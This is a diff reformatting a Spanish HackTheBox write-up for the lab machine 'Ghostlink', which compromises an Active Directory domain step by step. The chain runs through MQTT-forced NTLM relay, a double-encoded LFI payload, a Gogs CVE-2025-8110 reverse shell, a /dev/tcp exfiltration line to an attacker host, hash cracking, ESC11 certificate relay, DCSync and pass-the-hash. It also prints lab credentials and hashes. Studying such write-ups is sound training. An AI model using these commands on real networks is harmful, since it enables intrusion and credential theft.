@@ -22,12 +22,15 @@ layout:
 
 # Ghostlink HackTheBox (Hard)
 
-# Contexto de la maquina
-## Trayectoria Ghostlink
+## Ghostlink HackTheBox (Hard)
+
+## Contexto de la maquina
+
+### Trayectoria Ghostlink
 
 <figure><img src="../../.gitbook/assets/trayectoria_96331261fa.png" alt=""><figcaption></figcaption></figure>
 
-## Descripción
+### Descripción
 
 **Ghostlink** es una máquina Windows de dificultad **Hard** que simula un entorno de infraestructura crítica con un Domain Controller de Active Directory. La cadena de compromiso es larga y requiere correlacionar información de múltiples fuentes: un broker MQTT expuesto públicamente, subdominios descubiertos en los mensajes del broker, un NTLM Relay mediante SSRF forzado por MQTT, un LFI con doble codificación URL en una aplicación de archivo seguro, una base de datos KeePass descubierta mediante análisis forense del registro de Windows, y finalmente una cadena de ataques de PKI de Active Directory (ESC11) que termina con el compromiso total del dominio.
 
@@ -35,69 +38,76 @@ La máquina es especialmente interesante porque el broker MQTT actúa como pivot
 
 **Objetivo**
 
-- Descubrir subdominios internos y credenciales mediante escucha MQTT.
-- Forzar autenticación NTLM vía MQTT para acceder a servicios internos como `SVC_CANARY`.
-- Explotar LFI con doble codificación URL en `gpz-op26-secure` para extraer archivos del sistema.
-- Encontrar y abrir la base de datos KeePass para obtener credenciales de Gogs.
-- Explotar CVE-2025-8110 en Gogs para obtener shell como `git`.
-- Extraer y crackear hashes de la base de datos SQLite de Gogs para pivotar a `nvirelli`.
-- Crear un túnel SOCKS mediante SSH + Chisel para acceder a la red interna.
-- Explotar ESC11 mediante NTLM Relay sobre ICPR para obtener el certificado de `DC01$`.
-- Realizar DCSync con el hash de `DC01$` y hacer Pass-The-Hash como `Administrator`.
+* Descubrir subdominios internos y credenciales mediante escucha MQTT.
+* Forzar autenticación NTLM vía MQTT para acceder a servicios internos como `SVC_CANARY`.
+* Explotar LFI con doble codificación URL en `gpz-op26-secure` para extraer archivos del sistema.
+* Encontrar y abrir la base de datos KeePass para obtener credenciales de Gogs.
+* Explotar CVE-2025-8110 en Gogs para obtener shell como `git`.
+* Extraer y crackear hashes de la base de datos SQLite de Gogs para pivotar a `nvirelli`.
+* Crear un túnel SOCKS mediante SSH + Chisel para acceder a la red interna.
+* Explotar ESC11 mediante NTLM Relay sobre ICPR para obtener el certificado de `DC01$`.
+* Realizar DCSync con el hash de `DC01$` y hacer Pass-The-Hash como `Administrator`.
 
 **Tipo de máquina**
 
-- Plataforma: Hack The Box
-- Sistema operativo: Windows / Active Directory
-- Categoría principal: AD / PKI / IoT
-- Componentes involucrados:
-    - MQTT broker sin autenticación con telemetría de infraestructura.
-    - NTLM Relay via SSRF forzado por publicación MQTT.
-    - LFI con doble codificación URL en aplicación de archivo seguro.
-    - NTUSER.DAT + regripper para descubrimiento de archivos.
-    - Base de datos KeePass (`.kdbx`) con archivo de clave.
-    - Gogs 0.13.3 con CVE-2025-8110 (Symlink Traversal).
-    - SQLite de Gogs con hashes PBKDF2-HMAC-SHA256.
-    - Tunnel SOCKS: SSH local + Chisel reverse.
-    - Active Directory Certificate Services: ESC11 (ICPR Relay).
-    - certipy-ad + impacket-ntlmrelayx + coercer para ESC11.
-    - DCSync y Pass-The-Hash con evil-winrm.
+* Plataforma: Hack The Box
+* Sistema operativo: Windows / Active Directory
+* Categoría principal: AD / PKI / IoT
+* Componentes involucrados:
+  * MQTT broker sin autenticación con telemetría de infraestructura.
+  * NTLM Relay via SSRF forzado por publicación MQTT.
+  * LFI con doble codificación URL en aplicación de archivo seguro.
+  * NTUSER.DAT + regripper para descubrimiento de archivos.
+  * Base de datos KeePass (`.kdbx`) con archivo de clave.
+  * Gogs 0.13.3 con CVE-2025-8110 (Symlink Traversal).
+  * SQLite de Gogs con hashes PBKDF2-HMAC-SHA256.
+  * Tunnel SOCKS: SSH local + Chisel reverse.
+  * Active Directory Certificate Services: ESC11 (ICPR Relay).
+  * certipy-ad + impacket-ntlmrelayx + coercer para ESC11.
+  * DCSync y Pass-The-Hash con evil-winrm.
 
 **Habilidades y técnicas evaluadas**
 
-- Enumeración de servicios con Nmap.
-- Suscripción y análisis de mensajes MQTT.
-- Descubrimiento de subdominios internos vía telemetría MQTT.
-- NTLM Relay HTTP con impacket-ntlmrelayx en modo SOCKS.
-- Forzado de autenticación NTLM mediante publicación MQTT.
-- Navegación por recursos protegidos usando proxy SOCKS5 (FoxyProxy).
-- Path Traversal con doble codificación URL en Windows (`%252e%252e%255c`).
-- Análisis forense de NTUSER.DAT con regripper.
-- Extracción y apertura de base de datos KeePass.
-- Identificación de versión de Gogs mediante hash de commit.
-- Explotación de CVE-2025-8110 (Symlink Traversal en Gogs).
-- Extracción de hashes PBKDF2 de SQLite de Gogs.
-- Conversión de hashes Gogs a formato hashcat con GogsToHashcat.
-- Reducción inteligente de diccionario por política de contraseñas.
-- Crackeo de PBKDF2-HMAC-SHA256 con hashcat (modo 10900).
-- Tunelización SOCKS: SSH local forwarding + Chisel reverse.
-- Enumeración de plantillas de certificados vulnerables con certipy-ad.
-- ESC11: NTLM Relay sobre ICPR para obtener certificado de cuenta de máquina.
-- Coerción de autenticación del DC con coercer.
-- Autenticación con certificado PFX para obtener hash NT de `DC01$`.
-- DCSync con hash de cuenta de máquina del DC.
-- Pass-The-Hash como Administrator con evil-winrm.
-## Análisis de vulnerabilidades
+* Enumeración de servicios con Nmap.
+* Suscripción y análisis de mensajes MQTT.
+* Descubrimiento de subdominios internos vía telemetría MQTT.
+* NTLM Relay HTTP con impacket-ntlmrelayx en modo SOCKS.
+* Forzado de autenticación NTLM mediante publicación MQTT.
+* Navegación por recursos protegidos usando proxy SOCKS5 (FoxyProxy).
+* Path Traversal con doble codificación URL en Windows (`%252e%252e%255c`).
+* Análisis forense de NTUSER.DAT con regripper.
+* Extracción y apertura de base de datos KeePass.
+* Identificación de versión de Gogs mediante hash de commit.
+* Explotación de CVE-2025-8110 (Symlink Traversal en Gogs).
+* Extracción de hashes PBKDF2 de SQLite de Gogs.
+* Conversión de hashes Gogs a formato hashcat con GogsToHashcat.
+* Reducción inteligente de diccionario por política de contraseñas.
+* Crackeo de PBKDF2-HMAC-SHA256 con hashcat (modo 10900).
+* Tunelización SOCKS: SSH local forwarding + Chisel reverse.
+* Enumeración de plantillas de certificados vulnerables con certipy-ad.
+* ESC11: NTLM Relay sobre ICPR para obtener certificado de cuenta de máquina.
+* Coerción de autenticación del DC con coercer.
+* Autenticación con certificado PFX para obtener hash NT de `DC01$`.
+* DCSync con hash de cuenta de máquina del DC.
+* Pass-The-Hash como Administrator con evil-winrm.
+
+### Análisis de vulnerabilidades
 
 <figure><img src="../../.gitbook/assets/carta_Broker_MQTT_sin_autenticaci_n__1784205169151.png" alt=""><figcaption></figcaption></figure>
+
 <figure><img src="../../.gitbook/assets/carta_SSRF_forzado_por_MQTT_con_rela_1784205169626.png" alt=""><figcaption></figcaption></figure>
+
 <figure><img src="../../.gitbook/assets/carta_Path_Traversal_con_doble_codif_1784205170184.png" alt=""><figcaption></figcaption></figure>
+
 <figure><img src="../../.gitbook/assets/carta_Credenciales_almacenadas_en_ba_1784205170748.png" alt=""><figcaption></figcaption></figure>
+
 <figure><img src="../../.gitbook/assets/carta_Symlink_Traversal_en_Gogs_0.13_1784205171342.png" alt=""><figcaption></figcaption></figure>
+
 <figure><img src="../../.gitbook/assets/carta_Hashes_PBKDF2_crackeables_en_S_1784205171981.png" alt=""><figcaption></figcaption></figure>
+
 <figure><img src="../../.gitbook/assets/carta_ESC11__NTLM_Relay_sobre_ICPR_s_1784205172609.png" alt=""><figcaption></figcaption></figure>
 
-# Escaneo de puertos
+## Escaneo de puertos
 
 Comenzamos realizando un escaneo completo de todos los puertos TCP para identificar los servicios expuestos en la máquina objetivo. El flag `--open` nos filtra solo los puertos abiertos, `-sS` realiza un escaneo SYN (sigiloso), y `--min-rate 5000` acelera el proceso enviando al menos 5000 paquetes por segundo.
 
@@ -137,15 +147,16 @@ Service Info: Host: DC01; OS: Windows
 
 El perfil de puertos es el de un **Domain Controller de Active Directory** clásico. Los más relevantes:
 
-- **Puerto 53** → DNS, estándar en cualquier DC.
-- **Puerto 88** → Kerberos, protocolo de autenticación de AD.
-- **Puerto 389/636/3268** → LDAP y LDAP SSL para consultar el directorio.
-- **Puerto 445** → SMB.
-- **Puerto 5985** → WinRM, que usaremos al final para la shell de Administrator.
-- **Puerto 1883** → **MQTT**. Este es el hallazgo más inusual y el punto de entrada de toda la cadena.
+* **Puerto 53** → DNS, estándar en cualquier DC.
+* **Puerto 88** → Kerberos, protocolo de autenticación de AD.
+* **Puerto 389/636/3268** → LDAP y LDAP SSL para consultar el directorio.
+* **Puerto 445** → SMB.
+* **Puerto 5985** → WinRM, que usaremos al final para la shell de Administrator.
+* **Puerto 1883** → **MQTT**. Este es el hallazgo más inusual y el punto de entrada de toda la cadena.
 
 Del escaneo también extraemos el dominio (`ghostlink.htb`) y el hostname del DC (`DC01`).
-## Añadir dominio al /etc/hosts
+
+### Añadir dominio al /etc/hosts
 
 ```bash
 nano /etc/hosts
@@ -153,7 +164,8 @@ nano /etc/hosts
 # Dentro del nano añadimos la siguiente línea:
 <IP>            dc01.ghostlink.htb
 ```
-## Enumeración web
+
+### Enumeración web
 
 Accedemos al puerto 80:
 
@@ -166,11 +178,12 @@ Resultado:
 <figure><img src="../../.gitbook/assets/Pasted image 20260716092922.png" alt=""><figcaption></figcaption></figure>
 
 Página corporativa estándar. Nada relevante directamente. El hallazgo interesante viene del puerto MQTT.
-# Enumeración MQTT
+
+## Enumeración MQTT
 
 <figure><img src="../../.gitbook/assets/vuln_Broker_MQTT_sin_autenticación__94a83417.png" alt=""><figcaption></figcaption></figure>
 
-## Suscripción al broker MQTT
+### Suscripción al broker MQTT
 
 **MQTT** (Message Queuing Telemetry Transport) es un protocolo de mensajería ligero diseñado para dispositivos IoT y sistemas de telemetría. Funciona con un modelo publicador/suscriptor: los dispositivos publican mensajes en «topics» y los clientes interesados se suscriben a ellos. El broker (`mosquitto`) en el puerto `1883` actúa como intermediario.
 
@@ -189,13 +202,14 @@ GhostProtocolZero/systems/node/domain/healthcheck {"timestamp":"...","node":"nod
 GhostProtocolZero/systems/node/repository/healthcheck {"timestamp":"...","node":"node-5","telemetry":{"healthy":true,"url":"gpz-op26-toolkits.ghostlink.htb/healthcheck","responseCode":"200",...}}
 GhostProtocolZero/systems/node/secureshare/healthcheck {"timestamp":"...","node":"node-6","telemetry":{"healthy":true,"url":"gpz-op26-secure.ghostlink.htb/healthcheck","responseCode":"200",...}}
 ```
-## Subdominios internos descubiertos
+
+### Subdominios internos descubiertos
 
 Los mensajes de telemetría revelan varios subdominios que están devolviendo `200 OK`:
 
-- `gpz-op26-toolkits.ghostlink.htb` → IP `172.16.20.20`
-- `gpz-op26-secure.ghostlink.htb` → IP `172.16.20.10`
-- `dc01.ghostlink.htb` → IP `10.129.71.85`
+* `gpz-op26-toolkits.ghostlink.htb` → IP `172.16.20.20`
+* `gpz-op26-secure.ghostlink.htb` → IP `172.16.20.10`
+* `dc01.ghostlink.htb` → IP `10.129.71.85`
 
 Los añadimos todos al archivo de hosts:
 
@@ -205,7 +219,8 @@ nano /etc/hosts
 # Dentro del nano dejamos la línea así:
 <IP>            dc01.ghostlink.htb ghostlink.htb gpz-op26-toolkits.ghostlink.htb gpz-op26-secure.ghostlink.htb
 ```
-## Análisis de los subdominios
+
+### Análisis de los subdominios
 
 Accedemos a cada uno:
 
@@ -228,7 +243,8 @@ Resultado:
 <figure><img src="../../.gitbook/assets/Pasted image 20260716094234.png" alt=""><figcaption></figcaption></figure>
 
 Este subdominio responde con un **HTTP Basic Auth**. Sin credenciales por el momento, lo aparcamos y nos centramos en Gogs.
-## Identificación de la versión de Gogs
+
+### Identificación de la versión de Gogs
 
 Para explotar Gogs necesitamos saber la versión exacta. Gogs no la muestra directamente en la interfaz, pero incluye un hash de commit en los recursos estáticos que podemos correlacionar con el repositorio público de GitHub:
 
@@ -253,11 +269,12 @@ Resultado:
 <figure><img src="../../.gitbook/assets/Pasted image 20260716100013.png" alt=""><figcaption></figcaption></figure>
 
 El commit pertenece a la versión **0.13.3** de Gogs. Buscando vulnerabilidades para esta versión encontramos el **CVE-2025-8110**.
-# NTLM Relay via MQTT
+
+## NTLM Relay via MQTT
 
 <figure><img src="../../.gitbook/assets/vuln_SSRF_forzado_por_MQTT_con_rela_24ef86e5.png" alt=""><figcaption></figcaption></figure>
 
-## Vector de ataque: healthcheck como SSRF forzado
+### Vector de ataque: healthcheck como SSRF forzado
 
 La telemetría MQTT muestra que el servidor monitorea las URLs especificadas en los mensajes. Lo crítico es que el broker no requiere autenticación, por lo que cualquier cliente puede **publicar** mensajes en cualquier topic. Si modificamos la URL del healthcheck de `gpz-op26-secure` para que apunte a nuestra máquina, el servidor Windows intentará hacer una petición HTTP hacia nosotros autenticándose con **NTLM** (la autenticación integrada de Windows).
 
@@ -267,7 +284,8 @@ En lugar de solo capturar el hash NTLM, usamos **ntlmrelayx** en modo SOCKS para
 sudo impacket-ntlmrelayx -t http://gpz-op26-secure.ghostlink.htb -smb2support -socks \
   --no-smb-server --no-wcf-server --no-raw-server --no-rpc-server --no-winrm-server
 ```
-## Forzado de la autenticación vía MQTT
+
+### Forzado de la autenticación vía MQTT
 
 Con el relay a la escucha, publicamos un mensaje en el topic del healthcheck con nuestra IP como URL destino. Usamos `mqttui` porque `mosquitto_pub` puede dar problemas con la retención del mensaje en algunos entornos:
 
@@ -296,7 +314,8 @@ Protocol  Target                         Username              Port
 --------  -----------------------------  --------------------  ----
 HTTP      gpz-op26-secure.ghostlink.htb  GHOSTLINK/SVC_CANARY  80
 ```
-## Acceso a gpz-op26-secure via SOCKS5
+
+### Acceso a gpz-op26-secure via SOCKS5
 
 Configuramos FoxyProxy en el navegador apuntando al SOCKS5 de ntlmrelayx (por defecto en `127.0.0.1:1080`):
 
@@ -313,23 +332,25 @@ Resultado:
 <figure><img src="../../.gitbook/assets/Pasted image 20260716105709.png" alt=""><figcaption></figcaption></figure>
 
 El servidor acepta nuestra conexión autenticada como `SVC_CANARY` sin pedirnos contraseña. Somos el servidor interno.
-# LFI con doble codificación URL
+
+## LFI con doble codificación URL
 
 <figure><img src="../../.gitbook/assets/vuln_Path_Traversal_con_doble_codif_fcb4f7d3.png" alt=""><figcaption></figcaption></figure>
 
-## Descubrimiento del endpoint de descarga
+### Descubrimiento del endpoint de descarga
 
 Explorando la aplicación encontramos que permite subir y descargar archivos. La URL de descarga tiene la forma:
 
 ```
 http://gpz-op26-secure.ghostlink.htb/api/download/c5wxsbupo7aj.enc
 ```
-## Path Traversal con doble codificación
+
+### Path Traversal con doble codificación
 
 En sistemas Windows, las rutas usan barras invertidas (`\`). El servidor decodifica la URL una vez antes de validar la ruta. Si codificamos los caracteres de path traversal (`../` → `%2e%2e%5c`) con codificación URL, el servidor los decodifica y los bloquea. Pero si codificamos el símbolo de porcentaje también (`%` → `%25`), obtenemos doble codificación:
 
-- `..` → `%252e%252e` (el `%25` se decodifica a `%`, produciendo `%2e%2e` que luego se decodifica a `..`)
-- `\` → `%255c` (el `%25` se decodifica a `%`, produciendo `%5c` que luego se decodifica a `\`)
+* `..` → `%252e%252e` (el `%25` se decodifica a `%`, produciendo `%2e%2e` que luego se decodifica a `..`)
+* `\` → `%255c` (el `%25` se decodifica a `%`, produciendo `%5c` que luego se decodifica a `\`)
 
 Verificamos con el archivo `hosts` de Windows:
 
@@ -350,7 +371,8 @@ Resultado:
 ```
 
 El LFI funciona. Tenemos lectura arbitraria de archivos del sistema de archivos de Windows.
-## Análisis del NTUSER.DAT para encontrar archivos recientes
+
+### Análisis del NTUSER.DAT para encontrar archivos recientes
 
 Descargamos el registro de usuario de `svc_canary` para analizar su actividad reciente:
 
@@ -371,7 +393,8 @@ Del extenso output extraemos la sección de documentos recientes:
 Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip
   0 = db.zip
 ```
-## Localización de la ruta completa vía archivo .lnk
+
+### Localización de la ruta completa vía archivo .lnk
 
 El NTUSER.DAT nos dice que `svc_canary` abrió recientemente `db.zip`, pero no nos da la ruta completa. En Windows, los archivos recientes se almacenan como accesos directos (`.lnk`) en `AppData\Roaming\Microsoft\Windows\Recent`. Los archivos `.lnk` contienen la ruta completa del archivo original en texto plano:
 
@@ -384,7 +407,8 @@ Leemos el contenido del `.lnk`:
 ```
 C:\Users\svc_canary\Documents\Operations\Management\db.zip
 ```
-## Descarga de la base de datos KeePass
+
+### Descarga de la base de datos KeePass
 
 <figure><img src="../../.gitbook/assets/vuln_Credenciales_almacenadas_en_ba_cd00b919.png" alt=""><figcaption></figcaption></figure>
 
@@ -418,7 +442,8 @@ keepass2 db.kdbx
 En la interfaz de KeePass seleccionamos autenticación por archivo de clave y apuntamos a `key.keyx`.
 
 <figure><img src="../../.gitbook/assets/Pasted image 20260716114511.png" alt=""><figcaption></figcaption></figure>
-## Extracción de credenciales de KeePass
+
+\## Extracción de credenciales de KeePass
 
 En la entrada `Toolkits Repository` encontramos:
 
@@ -433,8 +458,8 @@ En la papelera de reciclaje de KeePass hay además un adjunto PDF llamado `passp
 
 <figure><img src="../../.gitbook/assets/Pasted image 20260716125604.png" alt=""><figcaption></figcaption></figure>
 
-- Longitud mínima: **20 caracteres**
-- Complejidad: **activada** (mayúsculas, minúsculas, números y símbolos)
+* Longitud mínima: **20 caracteres**
+* Complejidad: **activada** (mayúsculas, minúsculas, números y símbolos)
 
 Guardamos esto para más adelante.
 
@@ -443,18 +468,20 @@ Probamos las credenciales en Gogs:
 <figure><img src="../../.gitbook/assets/Pasted image 20260716115422.png" alt=""><figcaption></figcaption></figure>
 
 Funcionan. Ahora podemos explotar el CVE-2025-8110.
-# Escalate user git
+
+## Escalate user git
 
 <figure><img src="../../.gitbook/assets/vuln_Symlink_Traversal_en_Gogs_0.13_441db5a3.png" alt=""><figcaption></figcaption></figure>
 
-## CVE-2025-8110 — Symlink Traversal en Gogs 0.13.3
+### CVE-2025-8110 — Symlink Traversal en Gogs 0.13.3
 
 El **CVE-2025-8110** afecta a Gogs 0.13.3 y permite a un usuario autenticado crear un repositorio con un enlace simbólico que apunta a rutas arbitrarias fuera del directorio del repositorio. Cuando el servidor de Gogs procesa ese repositorio, sigue el enlace simbólico y expone o escribe en el archivo destino, resultando en RCE con los privilegios del proceso Gogs (`git`).
 
 El exploit está disponible en:
 
 URL = [Exploit GitHub CVE-2025-8110](https://github.com/zAbuQasem/gogs-CVE-2025-8110)
-## Modificación del exploit
+
+### Modificación del exploit
 
 El exploit intenta registrar un nuevo usuario por defecto. Como ya tenemos credenciales, comentamos esa línea y sustituimos las credenciales por las de `vroth`:
 
@@ -464,7 +491,8 @@ El exploit intenta registrar un nuevo usuario por defecto. Como ya tenemos crede
 username = "vroth"
 password = "mOo03jpsqx8JQYMBwvFP"
 ```
-## Obtención de la reverse shell
+
+### Obtención de la reverse shell
 
 Nos ponemos a la escucha:
 
@@ -499,7 +527,8 @@ git
 ```
 
 Somos `git`. Sanitizamos la TTY.
-## Sanitizacion shell (TTY)
+
+### Sanitizacion shell (TTY)
 
 La shell obtenida a través de una reverse shell suele ser muy limitada: no tiene autocompletado, no permite usar atajos de teclado como `Ctrl+C` sin matar la sesión, y en general es bastante incómoda. Por eso realizamos el siguiente proceso para convertirla en una TTY completamente interactiva:
 
@@ -521,11 +550,12 @@ stty size
 # Ajustamos las dimensiones de la shell remota para que coincidan
 stty rows <ROWS> columns <COLUMNS>
 ```
-# Escalate user nvirelli
+
+## Escalate user nvirelli
 
 <figure><img src="../../.gitbook/assets/vuln_Hashes_PBKDF2_crackeables_en_S_f1681df9.png" alt=""><figcaption></figcaption></figure>
 
-## Extracción de la base de datos SQLite de Gogs
+### Extracción de la base de datos SQLite de Gogs
 
 En el directorio home de `git` encontramos la base de datos SQLite de Gogs en `/opt/gogs/data/gogs.db`. La transferimos a nuestra máquina atacante:
 
@@ -536,7 +566,8 @@ nc -lvnp 7755 > gogs.db
 # Máquina víctima
 cat /opt/gogs/data/gogs.db > /dev/tcp/<IP_ATTACKER>/7755
 ```
-## Extracción de hashes de usuarios
+
+### Extracción de hashes de usuarios
 
 ```bash
 sqlite3 gogs.db "select username, passwd, salt, rands from user;"
@@ -544,11 +575,12 @@ sqlite3 gogs.db "select username, passwd, salt, rands from user;"
 
 El usuario que nos interesa es `nvirelli`, que tiene presencia en el sistema operativo. Sus campos relevantes son:
 
-- **Hash**: `8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8`
-- **Salt (rands)**: `DW3YdxPy25`
+* **Hash**: `8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8`
+* **Salt (rands)**: `DW3YdxPy25`
 
 Gogs almacena las contraseñas con **PBKDF2-HMAC-SHA256** (10.000 iteraciones), lo que hace el crackeo lento pero factible.
-## Conversión del hash al formato de hashcat
+
+### Conversión del hash al formato de hashcat
 
 Usamos **GogsToHashcat** para convertir el hash al formato que hashcat entiende (modo 10900):
 
@@ -564,7 +596,8 @@ Resultado:
 sha256:10000:RFczWWR4UHkyNQ==:jZs6AcOgJgs52wEa7R2/I5uLGyivYUHyiqAdOzq4/9RAi8W5Bl/5V+cWN1p77BdV0+g=
 Hash file successfully written as: hash
 ```
-## Reducción del diccionario por política de contraseñas
+
+### Reducción del diccionario por política de contraseñas
 
 Recordamos la política encontrada en `passpol.pdf`: mínimo 20 caracteres, con complejidad activada. Aunque parece una contraseña fuerte, esta política reduce drásticamente el número de candidatas en rockyou.txt:
 
@@ -580,7 +613,8 @@ Resultado:
 ```
 
 De más de 14 millones de entradas en rockyou.txt, solo 1.641 cumplen con la política. Esto hace el crackeo de PBKDF2 (normalmente muy lento) completamente viable:
-## Crackeo del hash con hashcat
+
+### Crackeo del hash con hashcat
 
 ```bash
 hashcat -m 10900 hash rockyou_filtered.txt --force
@@ -596,7 +630,8 @@ Time.Started: Thu Jul 16 15:04:58 2026 (0 secs)
 ```
 
 La contraseña de `nvirelli` es `u47YUclrDiwWxBheaSzI`.
-## Pivote a nvirelli
+
+### Pivote a nvirelli
 
 Desde la shell de `git` escalamos a `nvirelli`:
 
@@ -619,11 +654,10 @@ Leemos la flag del usuario:
 ```
 4f45ebb71a02c6876706d9bbcf563a3f
 ```
-# Escalate Privileges
 
-<figure><img src="../../.gitbook/assets/vuln_ESC11:_NTLM_Relay_sobre_ICPR_s_a00e89fd.png" alt=""><figcaption></figcaption></figure>
+## Escalate Privileges
 
-## Construcción del túnel SOCKS hacia la red interna
+### Construcción del túnel SOCKS hacia la red interna
 
 Estamos en el servidor `gpz-op26-toolkits` con IP `172.16.20.20` en la red interna. Para poder lanzar herramientas de AD desde nuestra máquina atacante contra el DC (`10.129.71.85`), necesitamos enrutar el tráfico a través de un túnel SOCKS.
 
@@ -669,7 +703,8 @@ tcp   LISTEN 0   4096   *:1080   *:*
 ```
 
 El SOCKS5 está disponible en nuestra máquina en el puerto `1080`. Todo el tráfico proxychains irá a través del servidor interno y de ahí al DC.
-## Enumeración de certificados vulnerables con certipy-ad
+
+### Enumeración de certificados vulnerables con certipy-ad
 
 Con el túnel activo, ejecutamos certipy-ad a través de proxychains para enumerar la infraestructura de certificados del dominio:
 
@@ -690,7 +725,8 @@ Certificate Authorities
 ```
 
 **ESC11** es nuestra vía de ataque. La CA no exige cifrado en las peticiones RPC (ICPR), lo que permite interceptar y reenviar autenticaciones NTLM directamente al servicio de certificados. Si coercionamos al DC para que se autentique y hacemos relay sobre ICPR, obtenemos un certificado firmado de la cuenta de máquina `DC01$`, que a su vez nos permite extraer su hash NT y realizar DCSync.
-## ESC11: NTLM Relay sobre ICPR
+
+### ESC11: NTLM Relay sobre ICPR
 
 Lanzamos ntlmrelayx apuntando al servicio RPC de la CA en la IP interna `172.16.20.10`:
 
@@ -723,7 +759,8 @@ En el relay vemos:
 [*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
 [*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Certificate successfully written to file
 ```
-## Extracción del hash NT de DC01$ con el certificado
+
+### Extracción del hash NT de DC01$ con el certificado
 
 Sincronizamos el reloj con el DC (Kerberos rechaza tickets con más de 5 minutos de diferencia) y usamos certipy-ad para autenticarnos con el certificado y obtener el hash NT de `DC01$`:
 
@@ -740,7 +777,8 @@ Resultado:
 [*] Got TGT
 [*] Got hash for 'dc01$@ghostlink.htb': aad3b435b51404eeaad3b435b51404ee:6c1bd4ae55673852429a59f025d068b2
 ```
-## DCSync con el hash de DC01$
+
+### DCSync con el hash de DC01$
 
 Con el hash NT de la cuenta de máquina del DC podemos realizar **DCSync**, que simula el proceso de replicación entre Domain Controllers y vuelca todos los hashes del dominio:
 
@@ -753,7 +791,8 @@ Del dump extraemos el hash NT del Administrator:
 ```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:8190e067f478002ddd63eb209b016696:::
 ```
-## Pass-The-Hash como Administrator
+
+### Pass-The-Hash como Administrator
 
 ```bash
 evil-winrm -i <IP_VICTIM> -u Administrator -H 8190e067f478002ddd63eb209b016696
@@ -773,4 +812,3 @@ Ya somos `Administrator` del dominio. Leemos la flag final:
 ```
 4da5ab6be3555747e63109a4eba6406e
 ```
-
